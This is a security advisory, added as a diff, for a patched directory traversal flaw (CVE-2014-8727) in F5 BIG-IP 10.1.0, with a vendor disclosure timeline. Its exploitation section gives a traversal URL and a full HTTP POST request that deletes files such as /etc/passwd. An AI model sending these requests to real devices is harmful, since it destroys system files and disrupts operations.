@@ -1,0 +1,55 @@
++------------------------------------------------------+
++ F5 BIG-IP 10.1.0 - Directory Traversal Vulnerability +
++------------------------------------------------------+
+Affected Product  : F5 BIG-IP
+Vendor Homepage    : http://www.f5.com/
+Version      : 10.1.0
+Vulnerability Category  : Local vulnerability
+Discovered by    : Anastasios Monachos (secuid0) - [anastasiosm (at) gmail (dot) com]
+CVE       : CVE-2014-8727
+Patched      : Yes
+
++-------------+
++ Description +
++-------------+
+An authenticated user with either "Resource Administrator" or "Administrator" role privileges is able to arbitrary enumerate files and subsequently delete them off the OS level. Any system file deletion, for instance under /etc, /boot etc would have a major functionality and operational impact for the device.
+
++----------------------+
++ Exploitation Details +
++----------------------+
+An authenticated user with either "Resource Administrator" or "Administrator" role privileges is able to enumerate files on the operating system and subsequently delete them off the OS level.
+
+In order to trigger the flaw, send a HTTP GET request similar to: https://<ip>/tmui/Control/jspmap/tmui/system/archive/properties.jsp?&name=../../../../../etc/passwd
+Condition: If file does not exist the application will return "File not found." If the file exists, the user can either send, a similar to, the next HTTP POST request or simply click on the Delete button through the GUI -the button will be displayed only if the enumerated file exists-.
+
+Sample HTTP POST request:
+
+POST /tmui/Control/form HTTP/1.1
+Host: <ip>
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://<ip>/tmui/Control/jspmap/tmui/system/archive/properties.jsp?name=../../../../../etc/passwd
+Cookie: JSESSIONID=6C6BADBEFB32C36CDE7A59C416659494; f5advanceddisplay=""; BIGIPAuthCookie=89C1E3BDA86BDF9E0D64AB60417979CA1D9BE1D4; BIGIPAuthUsernameCookie=admin; F5_CURRENT_PARTITION=Common; f5formpage="/tmui/system/archive/properties.jsp?&name=../../../../../etc/passwd"; f5currenttab="main"; f5mainmenuopenlist=""; f5_refreshpage=/tmui/Control/jspmap/tmui/system/archive/properties.jsp%3Fname%3D../../../../../etc/passwd
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 937
+
+_form_holder_opener_=&handler=%2Ftmui%2Fsystem%2Farchive%2Fproperties&handler_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&showObjList=&showObjList_before=&hideObjList=&hideObjList_before=&enableObjList=&enableObjList_before=&disableObjList=&disableObjList_before=&_bufvalue=icHjvahr354NZKtgQXl5yh2b&_bufvalue_before=icHjvahr354NZKtgQXl5yh2b&_bufvalue_validation=NO_VALIDATION&com.f5.util.LinkedAdd.action_override=%2Ftmui%2Fsystem%2Farchive%2Fproperties&com.f5.util.LinkedAdd.action_override_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&linked_add_id=&linked_add_id_before=&name=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&name_before=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form_page=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&form_page_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&download_before=Download%3A+..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&restore_before=Restore&delete=Delete&delete_before=Delete
+
++----------+
++ Solution +
++----------+
+F5 has already patched and mitigated the issue, for more information see ID363027 at the following URL:
+  https://support.f5.com/kb/en-us/solutions/public/13000/100/sol13109.html
+  https://support.f5.com/kb/en-us/products/big-ip_ltm/releasenotes/product/relnote_11_0_0_ltm.html
+
++---------------------+
++ Disclosure Timeline +
++---------------------+
+03-11-2014: Vendor notified at security-reporting [at] f5 [dot] com
+04-11-2014: Vendor responded with intent to investigate
+04-11-2014: Shared details with vendor
+05-11-2014: Vendor confirmed the issue is already patched, reference ID363027
+12-11-2014: Public disclosure
